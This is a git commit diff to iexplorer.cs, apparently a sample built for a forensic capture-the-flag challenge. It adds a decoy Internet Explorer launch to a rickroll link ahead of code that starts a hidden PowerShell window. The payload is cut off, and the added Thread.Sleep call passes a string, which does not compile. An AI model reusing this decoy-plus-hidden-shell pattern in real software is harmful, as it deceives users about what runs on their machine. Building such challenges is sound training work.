4911840b06cc1fbfc6a4a9221734d6db25cff66f
branoodle <65206138+branoodle@users.noreply.github.com>
2021-06-02 06:05:00 +0200

    Update iexplorer.cs
    truc à modif pour le challenge

--- Forensic/Dr.Jekyll & Mr.Hyde/iexplorer.cs
+++ Forensic/Dr.Jekyll & Mr.Hyde/iexplorer.cs
@@ -1,8 +1,11 @@
 using System;
 using System.Diagnostics;
+using System.Threading;
 namespace Explorer{
 	class Program{
 		static void Main(){
+			Process.Start("c:\\Program Files\\Internet Explorer\\iexplore.exe", "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+			Thread.Sleep("1500");
 			Process proc = new Process();
 			ProcessStartInfo procInfo = new ProcessStartInfo("powershell.exe");
 			procInfo.CreateNoWindow = true;
